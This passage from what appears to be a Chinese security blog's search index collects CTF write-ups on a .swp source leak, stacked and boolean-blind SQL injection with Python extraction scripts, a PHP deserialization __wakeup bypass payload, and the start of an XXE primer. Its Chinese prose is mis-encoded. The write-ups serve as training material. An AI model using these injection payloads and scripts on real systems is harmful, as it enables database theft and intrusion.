1ndexx.php æ‰“å¼€404 ï¼Œå°è¯•æ‰“å¼€å¤‡ä»½æ–‡ä»¶`.1ndexx.php.swp`\n\n![image-20230730103951694](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103951694-1691288556205-5.png)\n\n1. æŸ¥çœ‹æºä»£ç \n\n![image-20230730105041270](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105041270-1691288556205-6.png)\n\n1. ç›´æ¥è®¿é—®[hack](https://so.csdn.net/so/search?q=hack&spm=1001.2101.3001.7020).phpæ— æ³•è®¿é—® `show_source()`è¯»å–æ–‡ä»¶ï¼š\n\n```\n ?code=<?php show_source(__FILE__);?>\n```\n\n- `http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=<?php show_source(__FILE__);?>`\n- `http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php`\n\n![image-20230730105401597](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105401597-1691288556205-7.png)\n\n#### å…³äºshow_source()\n\n```\n show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚\n æœ¬å‡½æ•°æ˜¯ highlight_file() çš„åˆ«å\n 12\n```\n\n#### å…³äº.swpç¼“å­˜æ–‡ä»¶\n\næ–‡ä»¶æ³„éœ²(.swpå¤‡ä»½æ–‡ä»¶):éæ­£å¸¸å…³é—­vi/[vimç¼–è¾‘å™¨](https://so.csdn.net/so/search?q=vimç¼–è¾‘å™¨&spm=1001.2101.3001.7020)æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ \n\n```\n è°ƒç”¨è¿™ç±»çš„éšè—æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦åœ¨æœ€å‰é¢åŠ .\n```\n\n#### å®˜æ–¹WriteUp\n\n[find_it | CTFHub](https://writeup.ctfhub.com/Challenge/2021/ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›/Web/oKTHZCKnTRgZzifYg5twqZ.html)\n","tags":["web","å¤‡ä»½æ–‡ä»¶æ³„éœ²"],"categories":["CTF","ctfhub"]},{"title":"éšä¾¿æ³¨ 1","url":"/éšä¾¿æ³¨-1/","content":"\n### å¼ºç½‘æ¯2019-éšä¾¿æ³¨\n\n1ï¼Œæµ‹è¯•` 1' or 1=1 # `,åˆæ­¥åˆ¤å®šå­˜åœ¨SQLæ³¨å…¥ã€‚\n\n```sql\n1' or 1=1 #\n```\n\nå†æµ‹è¯•å­—æ®µæ•°ï¼Œåˆ°3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2.\n\n```sql\n1' order by 1 # \n```\n\næ¥ç€å°è¯•unionæ³¨å…¥,å›æ˜¾äº†è¿‡æ»¤çš„å…³é”®å­—ã€‚\n\n```sql\n1' union select 1,2#\n```\n\n![image-20230726152210746](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png)\n\nç„¶åå°±æ˜¯ä»Šå¤©å­¦ä¼šçš„æ–°å§¿åŠ¿â€œå †å æ³¨å…¥â€äº†ã€‚\nåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥ã€‚\nå…ˆé€šè¿‡show databasesçˆ†å‡ºæ•°æ®åº“ã€‚\n\n```sql\n0'; show databases; #\n```\n\nç„¶åç”¨ show tables å°è¯•çˆ†è¡¨ã€‚\n\n```sql\n0'; show tables; #\n```\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªè¡¨ï¼Œæˆ‘ä»¬å…ˆå°è¯•çˆ†wordsè¡¨çš„å†…å®¹ã€‚\n\n```sql\n1'; show columns from words; #\n```\n\nè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚\n\n```sql\n0'; show columns from `1919810931114514 `; #\n```\n\n1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚\n\n2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚\n\n3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚\n\n4ï¼Œå°† flag æ”¹åä¸º data ã€‚\n\n```sql\n1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#\n```\n\n\n\n","tags":["sqlæ³¨å…¥","buuctf"],"categories":["CTF","BUUCTF"]},{"title":"WebsiteManger","url":"/WebsiteManger/","content":"\n# 2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger\n\n![image-20230729200208646](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200208646.png)\n\n1. é¦–å…ˆf12æ£€æŸ¥æºæ–‡ä»¶ å‘ç°å›¾ç‰‡å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ ï¼š\n\n![image-20230729200355574](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200355574.png)\n\n**å¸ƒå°”ç›²æ³¨çŸ¥è¯†ç‚¹**\n\n- /image.php?id=if(1=1,1,5)              True\n- /image.php?id=if(1=2,1,5)              False\n\n`è§£é‡Š: æ¡ä»¶ä¸ºçœŸæ—¶?id=1ï¼Œå›æ˜¾ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œæ¡ä»¶ä¸ºå‡æ—¶?id=5ï¼Œæ²¡æœ‰id=5çš„å›¾ç‰‡ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚å³å¯ä½œä¸ºå¸ƒå°”ç›²æ³¨åˆ¤æ–­æ¡ä»¶`\n\n2. è„šæœ¬æµ‹è¯•ï¼š\n\n```python\nimport requests\n\nall_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~'\nurl = 'http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php'\ninfo = ''\n\nfor i in range(1, 50):\n    for s in all_str:\n        payload = '?id=if((ascii(mid(database(),{},1))={}),1,5)'.format(i, ord(s))\n        ans = requests.get(url=url + payload)\n        if len(ans.text) > 1000:\n            info += s\n            print(payload)\n            print(info)\n```\n\nä»¥ä¸Šåˆ¤æ–­å‡º`database()=ctf`\n\n![image-20230729200757857](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200757857.png)\n\n3. æ ¹æ®ç½‘ä¸Šwriteupæ¸…æ™°å¾—çŸ¥ï¼š\n\n```python\n#çˆ†ç ´æ•°æ®åº“\npayload = '?id=if((ascii(mid(database(),{},1))={}),1,5)'.format(i,ord(s))\n#çˆ†ç ´è¡¨å\npayload = '?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'ctf\\'),{},1))={},1,5)'.format(i,ord(s))\n#çˆ†ç ´åˆ—å\npayload = '?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\'),{},1))={},1,5)'.format(i,ord(s))\n#çˆ†ç ´å­—æ®µ\npayload = '?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),{},1))={},1,5)'.format(i,ord(s))\nè¿™é‡Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œå‘ç°çˆ†ç ´å­—æ®µå¾—åˆ°çš„ç»“æœä¸æ˜¯ctfä¸‹çš„usersçš„å­—æ®µï¼Œå› ä¸ºæ²¡æœ‰åŠ ctfè¿™ä¸ªé™åˆ¶ï¼Œåº”è¯¥æ˜¯çˆ†ç ´åˆ°äº†å…¶ä»–æ•°æ®åº“ä¸‹çš„usersä¸­çš„å­—æ®µï¼Œéœ€è¦åŠ ä¸Šæ•°æ®åº“åctfçš„é™åˆ¶æ¡ä»¶ï¼Œä¸è¿‡è¿™é‡Œé¢˜ç›®æœ‰å¯¹ â€˜andâ€™å…³é”®å­—è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦ç”¨â€˜&&â€™æ›¿æ¢ï¼Œè€Œä¸”è¿˜è¦ç¼–ç ä¸ºulræ ¼å¼â€˜%26%26â€™ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç”¨brupsuitæŠ“åŒ…åˆ†æäº†å¾ˆä¹…æ‰å‘ç°çš„ï¼Œä¸è¿‡åªè¦æœ‰è€å¿ƒï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå‘ç°ã€‚\nä¿®æ”¹åçš„payload\npayload = '?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\'/**/%26%26/**/table_schema=database()),{},1))={},1,5)'.format(i, ord(s))\n```\n\n- å…³é”®å‡½æ•°è§£é‡Š\n  - mid() å‡½æ•°ï¼šæˆªå–å­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ï¼Œmid(column_name,start[,length])\n  - ord() å‡½æ•°ï¼šæ˜¯ chr() å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸²ï¼‰ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ã€‚è¿”å›å€¼æ˜¯å¯¹åº”çš„åè¿›åˆ¶æ•´æ•°ã€‚\n  - group_concat() å‡½æ•°ï¼šè¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚èƒ½ä¸€æ¬¡æ€§æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯ã€‚group_concat(str1,str2,â€¦)\n\n4. æœ€åå¾—çŸ¥çš„ä¿¡æ¯\n\n```python\nTables_in_ctf: users,images\n\nColumns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password(æ­¤å¤„ä¸writeupæœ‰å‡ºå…¥)\n\nvalues_in_users: adminf5b86501931f812ed3833dee67a43603\n\t\t\t\t adminc6ef523a171bb9a25f4115044b507d69\n```\n\n![image-20230729202534279](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729202534279.png)\n\n5. ç™»å½•æˆåŠŸå\n\n![image-20230729204501099](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204501099.png)\n\næ­¤å¤„æµ‹è¯•å‘ç°æœ‰ssrfæ¼æ´ `è¾“å‡º127.0.0.1ååé¦ˆä¿¡æ¯å‡ºç°äº†(curl)`\n\n![image-20230729204645428](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204645428.png)\n\næŠ“åŒ…å¾—åˆ°flag\n\n![image-20230729204429740](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204429740.png)\n\n#### å®˜æ–¹æ³¨å…¥è„šæœ¬ \n\n```python\nimport requests\nimport string\n\ncharset = \",@\"+ string.digits + string.ascii_lowercase + string.ascii_uppercase\n\ndef r(s):\n    s = s.replace(\" \", \"/**/\")\n    return s\n\nsql = r(\"select concat(id,username,password) from users\")\nresult = \"\"\nfor i in range(1,50):\n    for c in charset:\n        cc = ord(c)\n        url = f\"http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid(({sql}),{i},1))={cc})\"\n        r = requests.get(url)\n        if len(r.text) > 1024:\n            result += c\n            print(result)\n            break\n```\n\n![image-20230729204144756](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204144756.png)\n","tags":["web","sqlæ³¨å…¥","ssrf"],"categories":["CTF","ctfhub"]},{"title":"ååºåˆ—åŒ–","url":"/ååºåˆ—åŒ–/","content":"\n# ååºåˆ—åŒ–\n\n## PHP ååºåˆ—åŒ–\n\n### serialize()\n\nserialize() ---> å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n\n```php\n<?php\nClass test{\n  public $a= '1';\n  public $bb= 2;\n  public $ccc= True;\n}\n\n$r= new test();\nechoserialize($r);\n\n$array_t= array(\"a\"=>\"1\",\"bb\"=>\"2\",\"ccc\"=>\"3\");\necho serialize($array_t);\n```\n\n> O:4:\"test\":3:{s:1:\"a\";s:1:\"1\";s:2:\"bb\";i:2;s:3:\"ccc\";b:1;}\n> a:3:\n\nå„ä¸ªå­—ç¬¦çš„æ„ä¹‰ ---> `ç¬¬ä¸€ä¸ªå­—æ¯O ä»£è¡¨ Objectï¼Œaä»£è¡¨ arrayï¼Œsä»£è¡¨ stringï¼Œ,iè¡¨ç¤ºæ•°å­—`\n\n![img](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640)\n**ç±»çš„å±æ€§æœ‰ä¸‰ç§ private protected å’Œ public**\n\nPHP åºåˆ—åŒ–çš„æ—¶å€™ **private**å’Œ **protected** å˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦`%00`ï¼Œ`%00ç±»å%00å±æ€§å` ä¸ºprivateï¼Œ`%00*%00å±æ€§å` ä¸ºprotectedï¼Œæ³¨æ„è¿™ä¸¤ä¸ª **%00**å°±æ˜¯ ascii ç ä¸º0 çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹å¾—æ¸…æ¥š\n\n```php\n<?php\nClass test{\n  private $a= \"a\";\n  protected $b= \"b\";\n  public $c= \"c\";\n}\n\n$r= new test();\necho serialize($r);\necho urlencode(serialize($r));\n```\n\n> O:4:\"test\":3:{s:7:\"testa\";s:1:\"a\";s:4:\"*b\";s:1:\"b\";s:1:\"c\";s:1:\"c\";}\n>\n> O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D\n\n### unserialize()\n\nunserialize() ---> å‡½æ•°ç”¨äºå°†é€šè¿‡ serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„\n\n```php\n<?php\n$sites = array('t1', 'tt2', 'ttt3');\n$serialized_data = serialize($sites);\n#echo  $serialized_data;\n$unserialized_data = unserialize($serialized_data);\nprint_r($unserialized_data);\n?>\n```\n\n> Array\n> (\n> â€‹ [0] => t1\n> â€‹ [1] => tt2\n> â€‹ [2] => ttt3\n> )\n\n### å¸¸ç”¨é­”æ³•å‡½æ•°\n\n| å¸¸ç”¨é­”æ³•å‡½æ•°  |                             å®šä¹‰                             |\n| :------------ | :----------------------------------------------------------: |\n| __construct() | åœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ã€‚åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³• |\n| __destruct()  | å’Œæ„é€ å‡½æ•°ç›¸åï¼Œå½“å¯¹è±¡æ‰€åœ¨å‡½æ•°è°ƒç”¨å®Œæ¯•åæ‰§è¡Œ.å³å½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³• |\n| __toString()  |              å½“å¯¹è±¡è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ã€‚              |\n| __sleep()     | å½“è°ƒç”¨`serialize()`å‡½æ•°æ—¶ï¼ŒPHP å°†è¯•å›¾åœ¨åºåˆ—åŠ¨ä½œä¹‹å‰è°ƒç”¨è¯¥å¯¹è±¡çš„æˆå‘˜å‡½æ•° __sleep()ã€‚è¿™å°±å…è®¸å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰åšä»»ä½•æ¸…é™¤æ“ä½œ |\n| __wakeup()    | ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰è°ƒç”¨è¯¥æ–¹æ³•.å½“ä½¿ç”¨ unserialize() æ¢å¤å¯¹è±¡æ—¶ï¼Œ å°†è°ƒç”¨ __wakeup() æˆå‘˜å‡½æ•° |\n| __invoke()    |             æŠŠä¸€ä¸ªå®ä¾‹å¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨             |\n| __call()      |          å½“è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚          |\n| __get()       |                åœ¨è°ƒç”¨ç§æœ‰å±æ€§çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ                |\n| __isset()     |          åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘          |\n| __unset()     |             åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘              |\n\n**__wakeup() bypass**\n\nåœ¨éœ€è¦å¯¹__wakeup() è¿›è¡Œç»•è¿‡çš„æ—¶å€™ï¼Œå¯ä»¥è®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡ï¼Œè¿™ä¸ªæ–¹å¼é€‚ç”¨äºPHP < 5.6.25 å’Œ PHP< 7.0.10\n\n```php\n<?php\nClass User{\n  public $name=\"Bob\";\n  \n  function __destruct(){\n    echo\"nameis Bob </br>\";\n  }\n  \n  function __wakeup(){\n    echo\"exit</br>\";\n  }\n}\n@var_dump(unserialize($_POST[\"u\"]));\n```\n\nPOST å‚æ•°O:4:\"User\":1:{s:4:\"name\";s:3:\"Bob\";}å¯ä»¥çœ‹åˆ°è¾“å‡ºæ˜¯ï¼š\n\n```php\nexit\n\nobject(User)[1]\n public 'name' => string 'Bob' (length=3)\n\nnameis Bob\n```\n\nå¦‚æœåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸æƒ³è®©__wakeup() æ‰§è¡Œï¼Œå¯ä»¥å°† \"User\"åçš„ 2 æ”¹ä¸ºä¸€ä¸ªæ¯”2 å¤§çš„æ•°å­—\n\nPOST å‚æ•°O:4:\"User\":2:{s:4:\"name\";s:3:\"Bob\";}ï¼š\n\n```mipsasm\nnameis Bob\n\nbooleanfalse\n```\n\n------\n\n**[XCTF]Web â€“ Web_php_unserialize**\n\né¢˜ç›®æºç ï¼š\n\n```php\n<?php \nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) {   #æ„é€ å‡½æ•°ï¼Œå¯¹ç±»çš„å˜é‡è¿›è¡Œåˆå§‹åŒ–\n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() {  #é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæœ‰ååºåˆ—åŒ–çš„ä½¿ç”¨ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•\n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) {         #å­˜åœ¨$var                   \n    $var = base64_decode($_GET['var']);   #å°†$var base64è§£ç å¹¶èµ‹å€¼$var\n    if (preg_match('/[oc]:\\d+:/i', $var)) { \n        die('stop hacking!'); \n    } else {\n        @unserialize($var); \n    } \n} else { \n    highlight_file(\"index.php\"); \n} \n?>\n```\n\næ€è·¯ï¼šä¸»è¦æ˜¯æ­£åˆ™ç»•è¿‡å’Œ_wakeupï¼ˆï¼‰ç»•è¿‡\n\næ­£åˆ™åŒ¹é…ï¼šå› ä¸ºä¸èƒ½åŒ¹é…`O:4`è¿™ç§ï¼Œæˆ‘ä»¬å¯ä»¥`O:+4`ç»•è¿‡ï¼Œå› ä¸ºåœ¨urlç¼–ç ä¸­`+`ä¼šè¢«è½¬æ¢ä¸ºç©ºæ ¼\n\n__wakeup()ç»•è¿‡ï¼šè®©åºåˆ—åŒ–ç»“æœä¸­ç±»å±æ€§çš„æ•°å€¼å¤§äºå…¶çœŸæ­£çš„æ•°å€¼è¿›è¡Œç»•è¿‡\n\n```php\n<?php\nclass Demo {\n    private $file = 'fl4g.php';\n}\n\n$a= new demo;\n$b=serialize($a);  //echo  O:4:\"Demo\":1:{s:10:\" Demo file\";s:8:\"fl4g.php\";}\n$b=str_replace('O:4', 'O:+4',$b);//ç»•è¿‡preg_match\n$b= str_replace(':1:', ':2:',$b);//ç»•è¿‡wakeup\necho base64_encode($b);     \n?>\n```\n\nå¾—åˆ°\n\n> TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\n\nå†è¿›è¡Œgetä¼ å‚å³å¯\n\n### phpåºåˆ—åŒ–è¡¥å……\n\nåŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œå¯¼è‡´ä»£ç \næ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œ\nååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚\n\n**serialize() //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²**\n**unserialize() //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡**\n\nè§¦å‘ï¼š`unserialize `å‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•ï¼š\n\n> æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚\n\n```bash\n__call() \t\t\t//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n__get() \t\t\t//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®\n__set() \t\t\t//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§\n__isset() \t\t//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset()æˆ– empty()è§¦å‘\n__unset() \t\t//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset()æ—¶è§¦å‘\n__invoke() \t\t//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n```\n\n### æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°\n\n- __construct()\n  å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥éå¸¸é€‚åˆåœ¨ä½¿ç”¨å¯¹è±¡ä¹‹å‰åšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚\n- __destruct()\n  ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚\n\n`new`å‡ºä¸€ä¸ªæ–°çš„å¯¹è±¡æ—¶å°±ä¼šè°ƒç”¨__construct(),è€Œå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¾‹å¦‚ç¨‹åºé€€å‡ºæ—¶ï¼Œå°±ä¼šè°ƒç”¨__destruct()\n\n### åºåˆ—åŒ–ç»†èŠ‚\n\n#### åºåˆ—åŒ–å«ä¹‰\n\nä¾‹å¦‚ï¼š`O:4:\"user\":2:{s:3:\"age\";i:18;s:4:\"name\";s:3:\"LEO\";}`\n Oä»£è¡¨å¯¹è±¡ï¼›4ä»£è¡¨å¯¹è±¡åé•¿åº¦ï¼›2ä»£è¡¨2ä¸ªæˆå‘˜å˜é‡ï¼›å…¶ä½™å‚ç…§å¦‚ä¸‹\n\n|  ç±»å‹   |                      ç»“æ„                      |\n| :-----: | :--------------------------------------------: |\n| String  |                 s:size:value;                  |\n| Integer |                    i:value;                    |\n| Boolean |               b:value;(ä¿å­˜1æˆ–0)               |\n|  Null   |                       N;                       |\n|  Array  |                    a:size:                     |\n| Object  | O:strlen(object name):object name:object size: |\n\n#### publicã€protectedã€privateä¸‹åºåˆ—åŒ–å¯¹è±¡çš„åŒºåˆ«\n\nphp v7.xååºåˆ—åŒ–çš„æ—¶å€™å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿ\n\n- publicå˜é‡\n  ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥\n- protectedå˜é‡\n  `\\x00 + * + \\x00 + å˜é‡å`\n  å¯ä»¥ç”¨`S:5:\"\\00*\\00op\"`æ¥ä»£æ›¿`s:5:\"?*?op\"`\n- privateå˜é‡\n  `\\x00 + ç±»å + \\x00 + å˜é‡å`\n\n## JAVAååºåˆ—åŒ–\n\nä¸‹æ–¹çš„ç‰¹å¾å¯ä»¥ä½œä¸ºåºåˆ—åŒ–çš„æ ‡å¿—å‚è€ƒ:\n\n- ä¸€æ®µæ•°æ®ä»¥`rO0AB`å¼€å¤´ï¼Œä½ åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯JAVAåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®ã€‚\n\n- æˆ–è€…å¦‚æœä»¥`aced`å¼€å¤´ï¼Œé‚£ä¹ˆä»–å°±æ˜¯è¿™ä¸€æ®µjavaåºåˆ—åŒ–çš„16è¿›åˆ¶\n","tags":["PHP","Java","unserialize"],"categories":["Web"]},{"title":"XML XXEæ¼æ´","url":"/XML-XXEæ¼æ´/","content":"\n# XML XXEæ¼æ´\n\n## åŸºç¡€æ¦‚å¿µ\n\n### 1ã€xmlåŸºç¡€æ¦‚å¿µ\n\nXMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒXMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXEæ¼æ´å…¨ç§°XMLExternal Entity 